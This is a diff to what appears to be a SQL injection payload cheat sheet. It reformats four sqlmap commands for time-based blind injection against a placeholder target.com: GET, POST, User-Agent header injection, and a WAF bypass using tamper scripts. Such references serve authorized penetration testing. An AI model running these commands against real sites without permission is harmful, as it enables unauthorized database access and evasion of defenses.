@@ -76,42 +76,25 @@ Load any .txt file directly as Intruder payload list.
 **SQLMap — HTTP GET**
 
 ```bash
-sqlmap -u "https://target.com/page?id=1" \
-  --technique=T \
-  --time-sec=10 \
-  --level=3 \
-  --risk=1 \
+sqlmap -u "https://target.com/page?id=1" --technique=T --time-sec=10 --level=3 --risk=1
 ```
 
 **SQLMap — HTTP POST**
 
 ```bash
-sqlmap -r /tmp/target.txt \
-  --technique=T \
-  --time-sec=10 \
-  --level=3 \
-  --risk=1 \
+sqlmap -r /tmp/target.txt --technique=T --time-sec=10 --level=3 --risk=1
 ```
 
 **SQLMap — HTTP Header injection**
 
 ```bash
-sqlmap -u "https://target.com/page" \
-  --technique=T \
-  --time-sec=10 \
-  --level=5 \
-  --risk=3 \
-  -p "User-Agent" \
-  --random-agent
+sqlmap -u "https://target.com/page" --technique=T --time-sec=10 --level=5 --risk=3 -p "User-Agent" --random-agent
 ```
 
 **SQLMap — WAF Bypass**
 
 ```bash
-sqlmap -u "https://target.com/page?id=1" \
-  --technique=T \
-  --time-sec=10 \
-  --tamper=space2comment,between,randomcase
+sqlmap -u "https://target.com/page?id=1" --technique=T --time-sec=10 --tamper=space2comment,between,randomcase
 ```
 
 - - -
